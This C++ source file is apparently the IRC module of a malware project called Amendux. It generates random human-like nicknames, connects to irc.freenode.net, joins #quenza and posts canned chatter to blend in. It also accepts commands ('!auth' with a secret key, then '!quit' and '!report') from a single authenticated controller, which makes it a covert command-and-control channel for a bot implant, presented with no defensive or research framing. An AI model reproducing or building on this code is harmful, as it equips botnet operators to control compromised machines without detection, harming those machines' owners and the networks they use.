#include "stdafx.h"
#include "Log.h"
#include "Config.h"
#include "Process.h"

#ifdef MODIRC_ENABLED
#include "IRCClient.h"

using namespace Amendux;

#define asz(a) sizeof(a)/sizeof(a[0])

#define DEFAULT_BUFSZ	1024

const char randomMessage[][40] = {
	"woops",
	"shoots", "iirc indeed",
	"yeah", "cool", "nice",
	"afaik, yes", "no", "lolz",
	"allright cool", "^^",
};

const char namePrefix[][5] = {
	"", "bel", "nar",
	"xan", "bell", "natr",
	"ev", "or", "lop", "nay",
	"vuy", "qeul", "wo",
};

const char nameSuffix[][5] = {
	"", "us", "ix", "ox", "ith",
	"ath", "um", "ator", "or", "axia",
	"imus", "ais", "itur", "orex", "o",
	"y", "oa", "ui", "oo", "aa", "ee", "uu"
};

const char nameStems[][10] = {
	"adur", "aes", "anim", "apoll", "imac",
	"educ", "equis", "extr", "guius", "hann",
	"equi", "amora", "hum", "iace", "ille",
	"inept", "iuv", "obe", "ocul", "orbis",
	"scor", "gam", "trek"
};

const char namePostFix[][10] = {
	"0", "9", "2", "6", "4",
	"5", "3", "7", "8", "1",
};

const char nameAddition[][5] = {
	"_", "__", "|AFK", "`", "-1",
	"_", "-7", "-EN", "__", "_US",
	"_", "^",
};


void IRCClient::GenerateNname(char *name) {
	name[0] = '\0';

	if (rand() % 8 == 0) {
		strcat_s(name, 32, namePostFix[(rand() % asz(namePostFix))]);
	}

	strcat_s(name, 32, namePrefix[(rand() % asz(namePrefix))]);
	strcat_s(name, 32, nameStems[(rand() % asz(nameStems))]);
	strcat_s(name, 32, nameSuffix[(rand() % asz(nameSuffix))]);

	if (rand() % 2) {
		name[0] = toupper(name[0]);
	}

	if (rand() % 4 == 0) {
		size_t i = (rand() % 5) + 3;
		name[i] = toupper(name[i]);
	}

	if (rand() % 5 == 0) {
		strcat_s(name, 32, namePostFix[(rand() % asz(namePostFix))]);
	}

	if (rand() % 6 == 0) {
		strcat_s(name, 32, nameAddition[(rand() % asz(nameAddition))]);
	}
}


int IRCClient::Read() {
	std::vector<char> response;

	char buffer[DEFAULT_BUFSZ + 1];

	int retval = 0;
	do {
		::memset(buffer, '\0', DEFAULT_BUFSZ + 1);
		retval = sock->recv(buffer, DEFAULT_BUFSZ);
		if (retval == 0) {
			break;
		} else if (retval < 1) {
			LogError(L"IRCClient", L"Socket error");
			return 0;
		}

		response.insert(response.end(), buffer, buffer + strlen(buffer));

	} while (retval == DEFAULT_BUFSZ);

	std::string _line;
	for (const auto& value : response) {
		if (value == '\n') {
			size_t q = _line.find_first_of(' ');
			if (q) {
				if (!serverIdent) {
					serverIdent = _strdup(_line.substr(0, q).c_str());
				}
			}

			if (_line[0] != ':' && _line[1] != ':' && _line[2] != ':') {
				std::string key = _line.substr(0, q);
				map.insert(std::make_pair(key, std::make_pair("", _line.substr(q + 1))));
				continue;
			}

			size_t qt = _line.find(' ', q+1);
			if (qt) {
				 std::string user = _line.substr(0, q);
				 std::string key = _line.substr(q + 1, qt - (q + 1));
				 if (key[0] == ':') {
					 key.erase(0, 1);
				 }
				 map.insert(std::make_pair(key, std::make_pair(user, _line.substr(qt + 1))));
			}
			_line.clear();
		} else if (value != '\r') {
			_line.push_back(value);
		}
	}

	return 1;
}


const char *IRCClient::GetIdentName(std::string& name)
{
	if (name.empty()) {
		return nullptr;
	}

	if (name[0] != ':') {
		return nullptr;
	}

	name.erase(0, 1);
	name.erase(name.find_first_of('!'));

	return name.c_str();
}


int IRCClient::Connect(const char *host)
{
	std::vector<std::string> notice;
	
	if (SimpleSocks::initSimpleSocks()) {
		LogError(L"IRCClient", L"Failed to initialize Simple Socks");
		return 0;
	}

	sock = new SimpleSocks::TCPSocket;
	if (sock->connect(host, 6667)) {
		LogError(L"IRCClient", L"Failed to connect to server");
		sock = nullptr;
		return 0;
	}

	Sleep(2000);
	Read();
	if (map.empty()) {
		return 0;
	}

	if (!serverIdent) {
		return 0;
	}

	map.clear();
	return 1;
}


int IRCClient::SendUser()
{
	char buf[256];

	if (!nickname) {
		return 0;
	}

	strcpy_s(buf, 256, "USER ");
	strcat_s(buf, 256, nickname);
	strcat_s(buf, 256, " localhost localhost ");
	strcat_s(buf, 256, nickname);
	strcat_s(buf, 256, "\r\n");

	int retval = sock->send(buf, (int)strlen(buf));
	if (retval < 1) {
		LogError(L"FTPClient", L"Connection was lost");
		return 0;
	}

	return 1;
}


int IRCClient::SendNick()
{
	char buf[256];
	std::vector<std::string> motd;

	if (!nickname) {
		return 0;
	}

resendnick:
	strcpy_s(buf, 256, "NICK ");
	strcat_s(buf, 256, nickname);
	strcat_s(buf, 256, "\r\n");

	int retval = sock->send(buf, (int)strlen(buf));
	if (retval < 1) {
		LogError(L"FTPClient", L"Connection was lost");
		return 0;
	}

recheck:
	Sleep(2000);
	Read();

	if (map.find("001") == map.end()) {
		if (map.find("433") != map.end()) {
			size_t sz = strlen(nickname);
			char *_nickname = new char[sz + 2];
			strcpy_s(_nickname, sz + 2, nickname);
			_nickname[sz] = '_';
			_nickname[sz + 1] = '\0';
			nickname = _nickname;
			goto resendnick;
		}
		if (map.find("NOTICE") != map.end()) {
			goto recheck;
		}
		return 0;
	}

	map.clear();
	return 1;
}


int IRCClient::SendPing()
{
	char buf[256];

	if (!serverIdent) {
		return 0;
	}

	strcpy_s(buf, 256, "PING ");
	strcat_s(buf, 256, serverIdent);
	strcat_s(buf, 256, "\r\n");

	int retval = sock->send(buf, (int)strlen(buf));
	if (retval < 1) {
		LogError(L"FTPClient", L"Connection was lost");
		return 0;
	}

	Read();

	if (map.find("PONG") == map.end()) {
		return 0;
	}

	map.clear();
	return 1;
}


int IRCClient::SendPong()
{
	char buf[256];

	if (!serverIdent) {
		return 0;
	}

	strcpy_s(buf, 256, "PONG ");
	strcat_s(buf, 256, serverIdent);
	strcat_s(buf, 256, "\r\n");

	int retval = sock->send(buf, (int)strlen(buf));
	if (retval < 1) {
		LogError(L"FTPClient", L"Connection was lost");
		return 0;
	}

	map.clear();
	return 1;
}


int IRCClient::JoinChannel(const char *channel)
{
	char buf[256];
	strcpy_s(buf, 256, "JOIN ");
	strcat_s(buf, 256, channel);
	strcat_s(buf, 256, "\r\n");

	int retval = sock->send(buf, (int)strlen(buf));
	if (retval < 1) {
		LogError(L"FTPClient", L"Connection was lost");
		return 0;
	}

	Read();

	if (map.find("JOIN") == map.end()) {
		return 0;
	}

	std::string join = map.find("JOIN")->second.second;
	if (join[0] != ':') {
		return 0;
	}

	join.erase(0, 1);
	if (join != channel) {
		return 0;
	}

	map.clear();
	return 1;
}


int IRCClient::LeaveChannel(const char *channel)
{
	char buf[256];
	strcpy_s(buf, 256, "PART ");
	strcat_s(buf, 256, channel);
	strcat_s(buf, 256, "\r\n");

	int retval = sock->send(buf, (int)strlen(buf));
	if (retval < 1) {
		LogError(L"FTPClient", L"Connection was lost");
		return 0;
	}

	Read();

	map.clear();
	return 1;
}


int IRCClient::Quit()
{
	char buf[256];
	strcpy_s(buf, 256, "QUIT\r\n ");

	int retval = sock->send(buf, (int)strlen(buf));
	if (retval < 1) {
		LogError(L"FTPClient", L"Connection was lost");
		return 0;
	}

	return 1;
}


int IRCClient::SendChatMessage(const char *channel, const char *message)
{
	char buf[256];

	strcpy_s(buf, 256, "PRIVMSG ");
	strcat_s(buf, 256, channel);
	strcat_s(buf, 256, " :");
	strcat_s(buf, 256, message);
	strcat_s(buf, 256, "\r\n");

	int retval = sock->send(buf, (int)strlen(buf));
	if (retval < 1) {
		LogError(L"FTPClient", L"Connection was lost");
		return 0;
	}

	return 1;
}


void IRCClient::ChatLoop() {
	map.clear();
	while (Read()) {
		if (map.find("PING") != map.end()) {
			SendPong();
		} else if (map.find("PRIVMSG") != map.end()) {
			std::string val = map.find("PRIVMSG")->second.second;
			size_t chat = val.find(':');
			std::string window = val.substr(0, chat - 1);
			std::string message = val.substr(chat + 1);

			if (window[0] == '#') {
				if (!message.compare(0, strlen(nickname), nickname)) {
					Sleep(200);
					SendChatMessage(window.c_str(), randomMessage[rand() % asz(randomMessage)]);
				}
			} else if (!window.compare(0, strlen(nickname), nickname)) {
				if (!authname) {
					const char *user = GetIdentName(map.find("PRIVMSG")->second.first);
					
					if (!message.compare(0,5,"!auth")) {
						std::string key = message.substr(6);
						if (key == VIGE_KEY) {
							authname = _strdup(user);
							SendChatMessage(authname, "Hi");
						}
					}
				} else {
					if (message == "!quit") {
						LeaveChannel(window.c_str());
						if (Quit()) {
							break;
						}
					} else if (message == "!report") {
						SendChatMessage(authname, "Sending reports....");
					}
				}
			}
		}

		map.clear();
	}
}


DWORD IRCClient::Run()
{
	char name[32];

	GenerateNname(name);
	SetNickName(name);

	if (!Connect("irc.freenode.net")) {
		return 0;
	}
		
	SendUser();
	if (!SendNick()) {
		return 0;
	}

	SendPing();
	JoinChannel("#quenza");

	ChatLoop();

	free((void *)serverIdent);

	return MOD_OK;
}
#endif
